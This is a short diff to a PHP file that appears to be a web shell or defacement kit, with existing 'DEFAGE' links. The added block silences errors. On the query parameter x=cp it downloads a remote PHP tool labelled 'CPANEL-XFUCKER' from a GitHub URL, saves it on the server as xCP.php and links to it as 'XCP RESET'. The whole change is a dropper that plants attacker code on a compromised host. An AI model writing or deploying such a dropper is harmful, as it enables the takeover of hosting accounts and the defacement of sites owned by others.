@@ -159,4 +159,14 @@ echo "<code><a href='xbug.php'>DEFAGE </a><code>";
     echo "<code><a href='?im=xfarianx'>DEFAGE </a></code>";
 }
 ?>
+<?php
+error_reporting(0);
+if ($_GET['x']=='cp') {
+$xfarian=file_get_contents('https://raw.githubusercontent.com/Th3-b4G/CPANEL-XFUCKER-V1/main/xfucker.php');
+file_put_contents("xCP.php",$xfarian);
+echo "<code><a href='xCP.php'> XCP RESET</a><code>";
+} else {
+    echo "<code><a href='?x=cp'> XCP RESET </a></code>";
+}
+?>
 </center>
